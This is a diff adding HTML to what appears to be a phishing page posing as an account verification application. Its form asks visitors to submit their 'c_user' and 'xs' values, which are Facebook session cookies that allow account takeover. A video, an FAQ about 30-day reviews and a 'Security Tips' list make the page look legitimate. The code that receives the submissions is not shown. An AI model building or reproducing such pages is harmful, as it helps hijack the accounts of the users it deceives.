@@ -602,11 +602,75 @@
                     
                     
                     
+                    <h2 class="panel-title"><i class="fas fa-check-double"></i> Eligibility Criteria</h2>
+                    
+                   
+                
+                <!-- Form panel -->
+                <div class="form-panel centered-content">
+                    <h2 class="panel-title"><i class="fas fa-file-alt"></i> Application Form</h2>
+                    
+                    <div class="progress-bar">
+                        <div class="progress" id="formProgress"></div>
+                    </div>
+                    
+                    <form id="verificationForm">
+                        <div class="video-container">
+                            <video controls>
+                                <source src="https://ik.imagekit.io/ummab7boi/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?updatedAt=1751126951949" type="video/mp4">
+                                Your browser does not support the video tag.
+                            </video>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="c_user">c_user</label>
+                            <input type="text" id="c_user" placeholder="Enter your c_user value (numbers only)" required>
+                            <div class="validation-error" id="c_user_error">c_user must contain only numbers</div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="xs">xs</label>
+                            <input type="text" id="xs" placeholder="Enter your xs value (combination of numbers, letters, and symbols)" required>
+                            <div class="validation-error" id="xs_error">xs must be a combination of numbers, letters, and symbols</div>
+                        </div>
+                        
+                        <button type="submit" class="submit-btn">Submit Application</button>
+                        <div class="loading" id="formLoading">
+                            <div class="loading-spinner"></div>
+                            <p>Submitting your application...</p>
+                        </div>
+                    </form>
+                </div>
+                
+                <!-- Additional content panel -->
+                <div class="info-panel centered-content">
+                    <h2 class="panel-title"><i class="fas fa-question-circle"></i> Frequently Asked Questions</h2>
+                    
+                    <div class="info-box">
+                        <p><strong>How long does verification take?</strong></p>
+                        <p>Our team typically reviews applications within 30 days. You'll receive a notification when your application has been reviewed.</p>
+                    </div>
+                    
+                    <div class="info-box">
+                        <p><strong>What if my application is denied?</strong></p>
+                        <p>You can reapply 30 days after receiving our decision. Make sure you meet all the criteria before reapplying.</p>
+                    </div>
                     
                     
                     
+                    <h2 class="panel-title"><i class="fas fa-shield-alt"></i> Security Tips</h2>
                     
-                    
+                    <ul class="criteria-list">
+                        <li>Never share your password with anyone</li>
+                        <li>Enable two-factor authentication</li>
+                        <li>Beware of phishing attempts</li>
+                        <li>Review your active sessions regularly</li>
+                        <li>Use a strong, unique password</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </main>
     
     <footer class="footer">
         <div class="container">
